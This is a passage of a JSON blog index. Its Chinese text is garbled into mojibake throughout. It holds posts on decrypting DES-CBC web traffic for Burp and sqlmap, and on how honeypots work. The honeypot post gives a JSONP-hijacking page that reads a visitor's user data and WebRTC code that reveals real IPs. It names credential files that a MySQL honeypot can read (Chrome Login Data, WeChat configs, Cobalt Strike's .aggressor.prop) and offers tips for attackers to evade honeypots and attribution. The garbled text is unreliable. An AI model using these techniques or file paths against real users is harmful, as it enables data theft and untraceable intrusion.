äº†å¯†ï¼Œå¯ä»¥çœ‹è§è¿™é‡Œæ˜¯ä»¥POSTæ–¹æ³•è¯·æ±‚/api/des-cbc/getUserInfoè·¯ç”±ï¼Œæ‰€ä»¥åœ¨æµè§ˆæ§åˆ¶å°è®¾ç½®xhræ–­ç‚¹æ‹¦æˆªè¯¥è·¯ç”±çš„POSTè¯·æ±‚ï¼š\nå†æ¬¡ç‚¹å‡»queryå‘ç°è¯·æ±‚åœåœ¨äº†æ–­ç‚¹å¤„ï¼Œä¸”å¯ä»¥çœ‹åˆ°åŠ è§£å¯†çš„ä¿¡æ¯ï¼š\nåŠ å¯†ä»£ç å¦‚ä¸‹ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥çœ‹åˆ°dataåŠ å¯†å‰çš„å€¼ï¼š\nè§£å¯†ä»£ç åœ¨è¯·æ±‚ä¹‹åï¼š\nåˆ†æä»£ç ï¼Œå¯ä»¥å¾—å‡ºç»“è®ºï¼š\ndesåŠ å¯†\nkeyä¸º12345678\nivä¸º12345678\nCBCæ¨¡å¼\npaddingä¸ºPkcs7\ngalaxyè‡ªåŠ¨åŠ è§£å¯† æ¥ä¸‹æ¥æ˜¯å·¥å…·hookéƒ¨åˆ†ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯galaxyï¼Œå½“ç„¶autodecoderä¹Ÿå¯ä»¥è¯•è¯•ï¼ˆæˆ‘è¿˜æ²¡å­¦ï¼‰ï¼š æˆ‘è¿™é‡Œé€‰æ‹©jythonçš„hookerï¼Œæ¨¡å¼å³des_cbcï¼Œhookerä¸­çš„å‚æ•°æŒ‰ç…§ä¸Šé¢åˆ†æå‡ºæ¥çš„è¿›è¡Œè®¾ç½®å³å¯:\né…ç½®å¥½ç›´æ¥startï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å¯¹åŠ å¯†çš„æµé‡åŒ…è¿›è¡Œè§£å¯†äº†ï¼š\nä¾‹å¦‚é€‰æ‹©decrypt requestï¼Œå³å¯å¾—åˆ°æ˜æ–‡è¯·æ±‚ï¼š\nå“åº”ä¹Ÿæ˜¯åŒç†ï¼š æ­¤æ—¶ï¼Œæˆ‘ä»¬å†å°†ç½‘é¡µè¯·æ±‚ä»£ç†åˆ°burpå³å¯å‘ç°è¯·æ±‚å’Œå“åº”éƒ½å·²ç»è¢«è‡ªåŠ¨è§£å¯†ï¼š\nåŒç†ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šå¯ä»¥å°†æœ‰åŠ å¯†çš„åŒ…send to sqlmapï¼ˆgalaxyè‡ªå¸¦çš„åŠŸèƒ½ï¼Œæ­¤æ—¶galaxyæ˜¯sqlmapå’ŒæœåŠ¡ç«¯çš„ä¸­é—´äººï¼Œèƒ½å¤Ÿè‡ªåŠ¨è¿›è¡Œæµé‡åŠ è§£å¯†ï¼‰ï¼Œè¿™ä¸ªå°±ä¸å¤šä»‹ç»äº†\n"
    }
,
    {
        "title": "èœœç½ç›¸å…³ç ”ç©¶",
        "link": "/My-Knowlege-Database/blog/rt%E6%8A%80%E6%88%98%E6%B3%95/%E8%9C%9C%E7%BD%90%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/",
        "content": "æµ…è°ˆèœœç½åŸç†ä¸è§„é¿ éšç€æ”»é˜²çš„ä¸æ–­å‘å±•ï¼Œå‚å•†å’Œè“é˜Ÿçš„é˜²å¾¡æ‰‹æ®µè¶Šæ¥è¶Šç²¾è¿›ï¼Œä¹Ÿæœ‰äº†å¾ˆå¤šæ–¹æ³•æº¯æºæ”»å‡»æ–¹ï¼Œèœœç½å°±æ˜¯å…¶ä¸­çš„ä¸€ç§ï¼Œå‰æ®µæ—¶é—´å—å­¦é•¿çš„æŒ‡ç‚¹ï¼Œç‰¹åœ°æ¥ç ”ç©¶ä¸€ä¸‹èœœç½çš„åŸç†å’Œè§„é¿\nèœœç½ï¼ˆhoneypotï¼‰ï¼Œå¸¦èœœçš„ç½å­ï¼Œè¿›å»åƒäº†èœœï¼Œå°±å‡ºä¸æ¥äº†ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªé™·é˜±ï¼Œåœ¨ç½‘å®‰é¢†åŸŸä¸Šçœ‹ï¼Œèœœç½å°±æ˜¯é’ˆå¯¹æ¸—é€æµ‹è¯•äººå‘˜ï¼ˆæ¯”å¦‚çº¢é˜Ÿï¼‰çš„ä¸€ä¸ªé™·é˜±\nèœœç½çš„ç±»å‹ä¹Ÿå¾ˆå¤šï¼Œä¸‹é¢ç®€å•è°ˆè°ˆå¸¸è§çš„å‡ ç§èœœç½\nWEBèœœç½ åŸºäºwebç½‘é¡µçš„èœœç½ï¼ŒåŸºæœ¬éƒ½æ˜¯é€šè¿‡jsä»£ç å®ç°æ”»å‡»ååˆ¶ï¼Œé¦–å…ˆå°±æ˜¯æ¯”è¾ƒå¸¸è§çš„jsonpèœœç½å’Œxssèœœç½äº†\njsonpèœœç½ é¡¾åæ€ä¹‰ï¼Œè¿™ç±»èœœç½å…¶å®æ˜¯åˆ©ç”¨äº†jsonpåŠ«æŒçš„åŸç†\njsonpè·¨åŸŸ jsonpæ˜¯ä»€ä¹ˆå°±ä¸å¤šè§£é‡Šäº†ï¼Œè¿™é‡Œç”¨ä¸€ä¸ªå°demoè®²è®²ä»€ä¹ˆæ˜¯jsonpè·¨åŸŸï¼š\nç°åœ¨æœ‰ä¸€ä¸ªç”¨äºjsonpçš„æ¥å£http://yuy0ung.fun/user?callback=ï¼Œè¯·æ±‚åä¼šè¿”å›å½“å‰å·²ç™»é™†ç”¨æˆ·ä¿¡æ¯ ç°åœ¨æ„é€ ä¸€ä¸ªé¡µé¢ï¼š \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function hackuser(result) { alert(result.name); } \u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;http://yuy0ung.fun/user?callback=hackuser\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; ç”¨æˆ·è®¿é—®ä¹‹åä¼šè§£æjsï¼Œå‘é€è¯·æ±‚:http://yuy0ung.fun/user?callback=hackuser\nç½‘ç«™Bæ¥æ”¶åˆ°è¯·æ±‚åï¼Œè§£æè¯·æ±‚çš„URLï¼Œä»¥JSON æ ¼å¼ç”Ÿæˆè¯·æ±‚éœ€è¦çš„æ•°æ®ï¼Œå°†å°è£…çš„åŒ…å«ç”¨æˆ·ä¿¡æ¯çš„JSONæ•°æ®ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°è¿”å›ç»™æµè§ˆå™¨ï¼Œæ¯”å¦‚ï¼š\nhackuser({\u0026#34;id\u0026#34;:1,\u0026#34;name\u0026#34;:\u0026#34;Yuy0ung\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;yuy0ung@test.com\u0026#34;}) è¿™é‡Œå°±å¾ˆæ˜æ˜¾ä¼šè§¦å‘å›è°ƒå‡½æ•°hackuserï¼Œå°†å½“å‰ç”¨æˆ·æ•°æ®alertå‡ºæ¥\nèœœç½åˆ†æ å’Œä¸Šé¢çš„jsonpè·¨åŸŸè¯·æ±‚åŒç†ï¼Œèœœç½å¯ä»¥é€šè¿‡jsonpè·¨åŸŸä¸»åŠ¨è·å–è®¿é—®è€…çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·åœ¨å…¶ä»–å·²ç™»é™†ç½‘ç«™ä¸Šçš„ç”¨æˆ·åã€æ‰‹æœºå·ã€IP\nä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š\nä¸€éƒ¨åˆ†èœœç½ä¼šåœ¨èµ„æºä¸­åŠ è½½/js/portrait.jsï¼š\næˆ‘åœ¨ä½¿ç”¨fofaè¯­æ³•body=\u0026quot;/js/portrait.js\u0026quot; \u0026amp;\u0026amp; country=\u0026quot;CN\u0026quot;è¿›è¡Œæœç´¢åæ‰¾åˆ°ä¸€ä¸ªçœ‹ä¼¼åå°çš„ç½‘é¡µï¼š\nè¿™é‡Œå°±å¯ä»¥ç”¨æˆ‘ä»¬çš„burpæ¥ç®€å•è¾¨åˆ«æ˜¯å¦ä¸ºèœœç½ï¼Œè¯·æ±‚ç½‘é¡µåæŸ¥çœ‹burpçš„http historyï¼š\nå‘ç°åœ¨åŠ è½½ç½‘ç«™ä¸Šçš„è¿™ä¸ª/js/portrait.jsåï¼Œå°±å¼€å§‹ä¸æ–­çš„è¯·æ±‚å…¶ä»–å¸¸ç”¨ç¤¾äº¤åª’ä½“ç½‘ç«™ï¼š\nå¯ä»¥çœ‹åˆ°ï¼šQQã€æœç‹—ã€æ–°æµªã€æœç‹ç­‰çš„ç½‘ç«™éƒ½æœ‰è¢«è¯·æ±‚ï¼Œå†ä»”ç»†çœ‹çœ‹è¿™äº›è¯·æ±‚åŒ…ï¼š\nqqï¼š\næœç‹—ï¼š\næ–°æµªï¼š\nè¿™é‡Œç®€å•åˆ—ä¸¾ä¸‰ä¸ªè¯·æ±‚åŒ…ï¼Œå¾ˆæ˜æ˜¾éƒ½å­˜åœ¨callbackå‚æ•°ï¼Œå¾ˆç»å…¸çš„jsonpè·¨åŸŸè¯·æ±‚äº†\nå¹¶ä¸”è¿™é‡Œçš„jsonpå›è°ƒå‡½æ•°æ ¼å¼éƒ½æ˜¯jsonp_callback_+æŸå­—ç¬¦ä¸²ï¼Œçœ‹çœ‹/js/portrait.jsï¼š\næœç„¶å‡ºç°äº†è¿™æ ·çš„ä»£ç ï¼Œç°åœ¨å¯ä»¥æ–­å®šè¿™ä¸ªç½‘é¡µå°±æ˜¯ä¸€ä¸ªèœœç½\nXSSèœœç½ XSSçš„åŸç†å°±ä¸è¿‡å¤šè§£é‡Šäº†\nè¿™é‡Œç¬”è€…ç†è§£çš„XSSèœœç½å°±æ˜¯å°†å­˜åœ¨XSSæ¼æ´çš„URLå­˜æ”¾åœ¨ç½‘é¡µä¸­ï¼Œæ¸—é€æµ‹è¯•äººå‘˜ç‚¹å‡»åå°±ä¼šè§¦å‘XSS\nåˆ©ç”¨æ–¹å¼å’Œå¸¸è§„XSSçš„åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œè¿™é‡Œç»™å‡ºä¸€ç§è·å–æ”»å‡»è€…IPçš„æ¡ˆä¾‹\nWebRTCè·å–IP WebRTCæ˜¯ä¸€ä¸ªå¾ˆè€çš„æŠ€æœ¯ï¼Œä½†æ˜¯å¾ˆå°‘æœ‰äººå…³æ³¨ï¼Œç°ä»£æµè§ˆå™¨åŸºæœ¬éƒ½æ”¯æŒå¹¶é»˜è®¤å¼€å¯ï¼Œå¦‚æœæœªæ›¾å…³é—­ï¼Œåˆ™å¯èƒ½ä¼šæš´éœ²ä½ çš„çœŸå®IPï¼Œå³ä½¿ä½ å¼€çš„æ˜¯å…¨å±€ä»£ç†\nå¯ä»¥ä½¿ç”¨è¿™ä¸ªç½‘ç«™è¿›è¡Œæ£€æµ‹https://ip8.com/webrtc-testï¼Œç¬”è€…ä¹Ÿä¸­æ‹›äº†ï¼š\nè€Œä¸Šé¢è¿™ä¸ªæŠ€æœ¯ä»…é€šè¿‡javascriptä»£ç å³å¯å®ç°ï¼Œè¿™äº›jsä»£ç å¯èƒ½ä¼šè¢«æ’å…¥åˆ°ç½‘ç«™ä¸­è¿›è¡ŒXSSåˆ©ç”¨\nä¸‹é¢ç»™å‡ºä¸€æ®µæµ‹è¯•ä»£ç ï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Get IP Addresses\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/element-ui@2.15.6/lib/theme-chalk/index.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@2.6.14\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/element-ui@2.15.6/lib/index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;el-container\u0026gt; \u0026lt;el-header\u0026gt; \u0026lt;h1\u0026gt;Your IP Addresses:\u0026lt;/h1\u0026gt; \u0026lt;/el-header\u0026gt; \u0026lt;el-main\u0026gt; \u0026lt;el-table :data=\u0026#34;ipAddresses\u0026#34; style=\u0026#34;width: 100%\u0026#34; border\u0026gt; \u0026lt;el-table-column prop=\u0026#34;type\u0026#34; label=\u0026#34;Type\u0026#34; width=\u0026#34;180\u0026#34;\u0026gt;\u0026lt;/el-table-column\u0026gt; \u0026lt;el-table-column prop=\u0026#34;address\u0026#34; label=\u0026#34;IP Address\u0026#34;\u0026gt;\u0026lt;/el-table-column\u0026gt; \u0026lt;/el-table\u0026gt; \u0026lt;/el-main\u0026gt; \u0026lt;/el-container\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; new Vue({ el: \u0026#39;#app\u0026#39;, data() { return { ipAddresses: [ { type: \u0026#39;XFF or CDN IP Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; }, { type: \u0026#39;WebRTC Local IP Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; }, { type: \u0026#39;WebRTC IPv4 Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; }, { type: \u0026#39;WebRTC IPv6 Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; } ] }; }, mounted() { // Fetch XFF or CDN IP address const xhr = new XMLHttpRequest(); xhr.open(\u0026#39;GET\u0026#39;, \u0026#39;get_real_ip.php\u0026#39;, true); xhr.onreadystatechange = () =\u0026gt; { if (xhr.readyState === 4 \u0026amp;\u0026amp; xhr.status === 200) { const jsonResponse = JSON.parse(xhr.responseText); this.ipAddresses[0].address = jsonResponse.ip; } }; xhr.send(); // WebRTC IPs const iceServers = [ { urls: \u0026#39;stun:stun.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun1.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun2.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun3.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun4.l.google.com:19302\u0026#39; }, ]; // getUserIPs function function getUserIPs(callback) { const myPeerConnection = new RTCPeerConnection({ iceServers }); myPeerConnection.createDataChannel(\u0026#34;\u0026#34;); myPeerConnection.createOffer().then(offer =\u0026gt; myPeerConnection.setLocalDescription(offer)); myPeerConnection.onicecandidate = function(event) { if (event.candidate) { const parts = event.candidate.candidate.split(\u0026#39; \u0026#39;); const ip = parts[4]; callback(ip); } }; } getUserIPs((ip) =\u0026gt; { // ... (same as before) const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/; const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}(([0-9a-fA-F]{1,4}:){1,4}|((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/; if (ipv4Regex.test(ip)) { this.ipAddresses[2].address = ip; } else if (ipv6Regex.test(ip)) { this.ipAddresses[3].address = ip; } else { this.ipAddresses[1].address = ip; } }); } }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æœ¬åœ°æ­å»ºå³å¯æµ‹è¯•ï¼š\nå…¶ä»– å½“ç„¶ï¼ŒWEBèœœç½èƒ½è·å–çš„ä¿¡æ¯è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œæåˆ°äº†èœœç½èƒ½å¤Ÿè·å–ä½¿ç”¨æ‰‹æœºçƒ­ç‚¹çš„çº¢é˜Ÿäººå‘˜çš„æ‰‹æœºå·ï¼š\nhttps://github.com/fuckjsonp/FuckJsonp-RCE-CVE-2022-26809-SQL-XSS-FuckJsonp\nè¿™ä¸ªæ–‡ç« å‘å¸ƒå‘¨æœŸæœ‰ç‚¹ä¹…äº†ï¼Œä½†è¿˜æ˜¯å€¼å¾—å‚è€ƒ\nè¯†åˆ«ä¸è§„é¿ å¯¹äºjsonpèœœç½ï¼Œæœ€å¤§çš„ç‰¹å¾å°±æ˜¯ä¼šè¯·æ±‚ä¸€äº›å¸¸ç”¨çš„ç¤¾äº¤åª’ä½“ç½‘ç«™ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ªç‰¹å¾è¿›è¡Œè¯†åˆ«ï¼Œé™¤äº†ä¸Šé¢é€šè¿‡æŸ¥çœ‹httphistoryï¼ŒF12ä¹Ÿå¯ä»¥æŸ¥çœ‹ç½‘é¡µè¯·æ±‚æˆåŠŸçš„å¤–éƒ¨ç½‘ç«™ï¼š\nå¦‚æœæƒ³è¦è¿›è¡Œè§„é¿ï¼Œå¯ä»¥å°è¯•å†™ä¸€ä¸ªèœœç½æ‰«æå™¨ï¼Œå°†æ¸—é€æµ‹è¯•çš„ç›®æ ‡æ¸…å•è¿›è¡Œè‡ªåŠ¨åŒ–çš„ç­›é€‰ï¼Œå¯èƒ½ç”¨åˆ°çš„trickå¦‚ä¸‹ï¼š\nç½‘ç«™çˆ¬è™«å¯¹ç›®æ ‡ç½‘ç«™çš„é¡µé¢å’Œrequestè¿›è¡ŒæŠ“å–\nå¯¹requestä¸­è¯·æ±‚çš„å¤–éƒ¨ç½‘ç«™ä»¥åŠè¯·æ±‚æ•°é‡è¿›è¡Œè‡ªåŠ¨åŒ–åˆ†æï¼ˆåŸºäºä¸Šé¢æåˆ°çš„ç‰¹å¾ï¼‰\nä½ ç”šè‡³å¯ä»¥æŠŠå·²è¯†åˆ«çš„èœœç½ä¸­è¯·æ±‚çš„requestæå–å‡ºæ¥ä½œä¸ºä¸€ä¸ªå­—å…¸\nè¿˜å¯ä»¥æŠŠå·²è¯†åˆ«çš„èœœç½ä¸­åŠ è½½çš„jsæ–‡ä»¶ï¼ˆæ¯”å¦‚ä¸Šé¢jsonpèœœç½çš„/js/portrait.jsï¼‰æå–å‡ºæ¥ä½œä¸ºå­—å…¸\nå½“ç„¶ï¼Œç°åœ¨ä¹Ÿæœ‰å¾ˆå¤šæµè§ˆå™¨æ’ä»¶èƒ½å¤Ÿè¯†åˆ«WEBèœœç½å¹¶æ‹¦æˆªå…¶jsè¡Œä¸ºï¼ŒGoby çº¢é˜Ÿç‰ˆä¹Ÿæ”¯æŒå¯¹èœœç½çš„è¯†åˆ«\næ¯”å¦‚æˆ‘è‡ªå·±å†™äº†ä¸€ä¸ªfirefoxçš„è¢«åŠ¨æ‰«ææ’ä»¶ï¼Œæ„Ÿå…´è¶£å¯ä»¥ç‚¹ç‚¹starğŸ˜˜ï¼š\nhttps://github.com/Yuy0ung/Niffler/\nMYSQLèœœç½ åŸºç¡€çš„åŸç†æ˜¯ï¼šmysqlä¸­æœ‰ä¸€ä¸ªload data local infileå‡½æ•°èƒ½å¤Ÿè¯»å–æœ¬åœ°æ–‡ä»¶åˆ°mysqlæ•°æ®åº“ä¸­\nåˆ©ç”¨è¿™ä¸ªæ€è·¯ï¼ŒMYSQLèœœç½è¯ç”Ÿäº†ä¸€ä¸ªæ”»å‡»ååˆ¶æ‰‹æ®µï¼šåªè¦æ¸—é€æµ‹è¯•äººå‘˜å°è¯•è¿æ¥è¯¥mysqlèœœç½ï¼Œå°±å¯ä»¥è¢«èœœç½è¯»å–åˆ°æœ¬åœ°é…ç½®æ–‡ä»¶ï¼Œç”šè‡³ä¸éœ€è¦æä¾›æ­£ç¡®çš„ç”¨æˆ·åå¯†ç \nå¦‚æœæƒ³è¦äº†è§£è¯¦ç»†çš„åŸç†ï¼Œå»ºè®®å‚è€ƒäº’è”ç½‘çš„æ–‡ç« è‡ªè¡Œåˆ¶ä½œä¸€ä¸ªmysqlèœœç½ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°äº†\nèœœç½è¡Œä¸º ç”±äºè¯¥èœœç½å¯ä»¥è¯»å–è¿æ¥æ–¹çš„æœ¬åœ°æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥æœ‰å¾ˆå¤šè·å–è¿æ¥æ–¹ä¿¡æ¯çš„æ€è·¯ï¼Œè¿™é‡Œä»¥windowsä¸»æœºä¸¾ä¾‹ï¼š\nè¯»å–å¾®ä¿¡å·\nwinç³»ç»Ÿä¸‹ï¼Œè¯»å–æ‰‹æœºå·å’Œå¾®ä¿¡IDçš„æ–¹æ³•(é»˜è®¤å¸¸è§å¾®ä¿¡æ–‡ä»¶è·¯å¾„) ï¼š\né€šè¿‡C:/Windows/PFRO.logè·å–windowsç”¨æˆ·å é€šè¿‡C:/Users/ç”¨æˆ·å/Documents/WeChat Files/All Users/config/config.dataè·å–wxid é€šè¿‡C:/Users/ç”¨æˆ·å/Documents/WeChat Files/wx_id/config/AccInfo.datè·å–å¾®ä¿¡å·ã€æ‰‹æœºå· è¯»å–chromeçš„ç™»å½•æ•°æ®\nè¯»å–chromeçš„login dataï¼Œè™½ç„¶æ— æ³•è§£å¯†å‡ºå¯†ç ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥è·å–åˆ°å¯¹æ–¹çš„ä¸€äº›è´¦å·C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/Login Data\nchromeçš„å†å²è®°å½•\nchromeçš„å†å²è®°å½•æ–‡ä»¶C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/History\nCSè¿æ¥ä¿¡æ¯\nåªè¦æ˜¯ä½¿ç”¨cså®¢æˆ·ç«¯è¿æ¥è¿‡csæœåŠ¡ç«¯çš„ç”µè„‘ï¼Œcså®¢æˆ·ç«¯éƒ½ä¼šåœ¨å›ºå®šçš„æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆä¸€ä¸ª.aggressor.propé…ç½®æ–‡ä»¶ã€‚å¯¹äºWindowsç³»ç»Ÿï¼Œé‚£ä¹ˆæ–‡ä»¶ä½ç½®æ˜¯ï¼šC:\\Users\\Administrator\\.aggressor.propï¼Œè¿™ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢å°±åŒ…å«äº†csè¿œæ§çš„ipåœ°å€ã€ç«¯å£ã€ç”¨æˆ·ååŠå¯†ç ï¼Œè€Œä¸”éƒ½æ˜¯æ˜æ–‡çš„\n\u0026hellip;\u0026hellip;\nç»¼ä¸Šï¼ŒMYSQLèœœç½åŒæ ·æœ‰å¾ˆå¤šæ–¹æ³•æ¥è·å–æ¸—é€æµ‹è¯•äººå‘˜çš„æ•æ„Ÿä¿¡æ¯\nèœœç½è§„é¿ ä¸ªäººè®¤ä¸ºï¼Œmysqlèœœç½çš„è¯†åˆ«å¯èƒ½ä¼šç›¸å¯¹ç¹çï¼Œéœ€è¦æ ¹æ®è¿æ¥æ—¶çš„åè®®è¿”å›ç‰¹å¾ã€åè®®å®ç°ç¼ºé™·æ¥åˆ¤æ–­ï¼Œæ‰€ä»¥è§„é¿çš„æœ€å¥½æ–¹å¼å°±æ˜¯åœ¨æ¸—é€æµ‹è¯•æ—¶ä½¿ç”¨è™šæ‹Ÿæœº\næ€»ç»“ ä¸Šé¢åªå¯¹å¸¸è§çš„èœœç½è¿›è¡Œäº†ç®€å•çš„é˜è¿°ï¼Œè¿˜æœ‰å¾ˆå¤šå˜ç§æˆ–ä¼˜åŒ–åçš„èœœç½ï¼Œäº¤äº’æ€§å’Œä»¿çœŸæ€§éå¸¸é«˜ï¼Œæ„Ÿå…´è¶£å¯ä»¥ç»§ç»­äº†è§£\nå†æä¸€æï¼š\nå¯¹äºèœœç½çš„è§„é¿ï¼Œä¸ªäººè®¤ä¸ºï¼Œæ¯”èµ·ä½¿ç”¨è‡ªå·±çš„ä¸ªäººç”µè„‘ï¼Œæœ€å¥½è¿˜æ˜¯å‚è€ƒ çº¯è™šæ‹Ÿæœºï¼ˆæ— ä»»ä½•ä¸ªäººä¿¡æ¯ï¼‰+ å¤šå±‚ç½‘ç»œä»£ç† + å›½å¤–VPS è¿™ç§æ€è·¯æ¥è¿›è¡Œé…ç½®æ›´åŠ å®‰å…¨\n",
        "summary": "æµ…è°ˆèœœç½åŸç†ä¸è§„é¿ éšç€æ”»é˜²çš„ä¸æ–­å‘å±•ï¼Œå‚å•†å’Œè“é˜Ÿçš„é˜²å¾¡æ‰‹æ®µè¶Šæ¥è¶Šç²¾è¿›ï¼Œä¹Ÿæœ‰äº†å¾ˆå¤šæ–¹æ³•æº¯æºæ”»å‡»æ–¹ï¼Œèœœç½å°±æ˜¯å…¶ä¸­çš„ä¸€ç§ï¼Œå‰æ®µæ—¶é—´å—å­¦é•¿çš„æŒ‡ç‚¹ï¼Œç‰¹åœ°æ¥ç ”ç©¶ä¸€ä¸‹èœœç½çš„åŸç†å’Œè§„é¿\nèœœç½ï¼ˆhoneypotï¼‰ï¼Œå¸¦èœœçš„ç½å­ï¼Œè¿›å»åƒäº†èœœï¼Œå°±å‡ºä¸æ¥äº†ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªé™·é˜±ï¼Œåœ¨ç½‘å®‰é¢†åŸŸä¸Šçœ‹ï¼Œèœœç½å°±æ˜¯é’ˆå¯¹æ¸—é€æµ‹è¯•äººå‘˜ï¼ˆæ¯”å¦‚çº¢é˜Ÿï¼‰çš„ä¸€ä¸ªé™·é˜±\nèœœç½çš„ç±»å‹ä¹Ÿå¾ˆå¤šï¼Œä¸‹é¢ç®€å•è°ˆè°ˆå¸¸è§çš„å‡ ç§èœœç½\nWEBèœœç½ åŸºäºwebç½‘é¡µçš„èœœç½ï¼ŒåŸºæœ¬éƒ½æ˜¯é€šè¿‡jsä»£ç å®ç°æ”»å‡»ååˆ¶ï¼Œé¦–å…ˆå°±æ˜¯æ¯”è¾ƒå¸¸è§çš„jsonpèœœç½å’Œxssèœœç½äº†\njsonpèœœç½ é¡¾åæ€ä¹‰ï¼Œè¿™ç±»èœœç½å…¶å®æ˜¯åˆ©ç”¨äº†jsonpåŠ«æŒçš„åŸç†\njsonpè·¨åŸŸ jsonpæ˜¯ä»€ä¹ˆå°±ä¸å¤šè§£é‡Šäº†ï¼Œè¿™é‡Œç”¨ä¸€ä¸ªå°demoè®²è®²ä»€ä¹ˆæ˜¯jsonpè·¨åŸŸï¼š\nç°åœ¨æœ‰ä¸€ä¸ªç”¨äºjsonpçš„æ¥å£http://yuy0ung.fun/user?callback=ï¼Œè¯·æ±‚åä¼šè¿”å›å½“å‰å·²ç™»é™†ç”¨æˆ·ä¿¡æ¯ ç°åœ¨æ„é€ ä¸€ä¸ªé¡µé¢ï¼š \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function hackuser(result) { alert(result.name); } \u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;http://yuy0ung.fun/user?callback=hackuser\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; ç”¨æˆ·è®¿é—®ä¹‹åä¼šè§£æjsï¼Œå‘é€è¯·æ±‚:http://yuy0ung.fun/user?callback=hackuser\nç½‘ç«™Bæ¥æ”¶åˆ°è¯·æ±‚åï¼Œè§£æè¯·æ±‚çš„URLï¼Œä»¥JSON æ ¼å¼ç”Ÿæˆè¯·æ±‚éœ€è¦çš„æ•°æ®ï¼Œå°†å°è£…çš„åŒ…å«ç”¨æˆ·ä¿¡æ¯çš„JSONæ•°æ®ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°è¿”å›ç»™æµè§ˆå™¨ï¼Œæ¯”å¦‚ï¼š\nhackuser({\u0026#34;id\u0026#34;:1,\u0026#34;name\u0026#34;:\u0026#34;Yuy0ung\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;yuy0ung@test.com\u0026#34;}) è¿™é‡Œå°±å¾ˆæ˜æ˜¾ä¼šè§¦å‘å›è°ƒå‡½æ•°hackuserï¼Œå°†å½“å‰ç”¨æˆ·æ•°æ®alertå‡ºæ¥\nèœœç½åˆ†æ 